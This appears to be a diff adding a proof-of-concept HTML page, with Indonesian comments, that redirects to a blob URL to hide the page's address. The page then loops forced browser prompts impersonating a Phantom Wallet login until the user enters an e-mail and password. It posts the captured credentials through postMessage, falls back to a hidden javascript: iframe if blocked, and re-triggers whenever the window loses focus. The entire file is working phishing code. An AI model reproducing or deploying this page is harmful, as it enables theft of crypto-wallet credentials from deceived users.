@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, user-scalable=no" />
+  <title>Blob Null → Forced Prompt Escalation</title>
+
+  <!-- Pertahankan sandbox agar alamat jadi blank/null; izinkan scripts & modals -->
+  <meta http-equiv="Content-Security-Policy" content="sandbox allow-scripts allow-modals">
+
+  <style>
+    body { font-family: system-ui, sans-serif; text-align: center; padding-top: 120px; }
+    button { padding: 12px 18px; border-radius: 10px; border: 1px solid #ccc; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h1>Open Test</h1>
+  <p>Tap the button below to start the blob redirection.</p>
+  <button id="go">Start</button>
+
+  <script>
+    document.getElementById('go').addEventListener('click', () => {
+      // HTML yang akan dimuat di dalam Blob (alamat bar menjadi blank/null)
+      const blobInner = `
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <title>Bypass sandbox WebView – forced prompt (Blob)</title>
+  <style>iframe{visibility:hidden;position:absolute;width:0;height:0;border:0;}</style>
+</head>
+<body>
+  <center><h1>Loading…</h1></center>
+  <iframe id="shim"></iframe>
+
+  <script>
+    (function(){
+      var msg =
+        'In order to access phantom.app\\n' +
+        'you must first login on your\\nPhantom Wallet Account.\\n\\n' +
+        'Please type your e-mail\\nand your password:';
+
+      function directLoop(){
+        try {
+          var v = '';
+          while (v === null || (''+v).trim() === '') {
+            v = prompt(msg, 'E-mail / Password.');
+          }
+          try { top.postMessage({creds: v, from: 'blob-forced-prompt'}, '*'); } catch(e) {}
+        } catch(e) {
+          return false;
+        }
+        return true;
+      }
+
+      function iframeJsLoop(){
+        try {
+          var code =
+            "(function(){try{"
+            + "var m=" + JSON.stringify(msg) + ";"
+            + "var v='';"
+            + "while(v===null||(''+v).trim()===''){"
+            + "  v=prompt(m,'E-mail / Password.');"
+            + "}"
+            + "try{top.postMessage({creds:v,from:'iframe-javascript'},'*');}catch(e){}"
+            + "}catch(e){}})()";
+          var shim = document.getElementById('shim');
+          shim.src = 'javascript:' + code;
+          return true;
+        } catch(e) { return false; }
+      }
+
+      // 1) Coba langsung (paling sederhana)
+      var ok = directLoop();
+
+      // 2) Jika diblok, fallback lewat hidden iframe + javascript: URL
+      if (!ok) iframeJsLoop();
+
+      // 3) Tambahan: kalau user switch app lalu balik, tembak lagi
+      window.onblur = function(){
+        setTimeout(function(){
+          if (!directLoop()) iframeJsLoop();
+        }, 50);
+      };
+    })();
+  </script>
+</body>
+</html>
+      `;
+
+      // Buat Blob dan redirect
+      const blob = new Blob([blobInner], { type: 'text/html' });
+      const url = URL.createObjectURL(blob);
+      location.href = url;
+    });
+  </script>
+</body>
+</html>
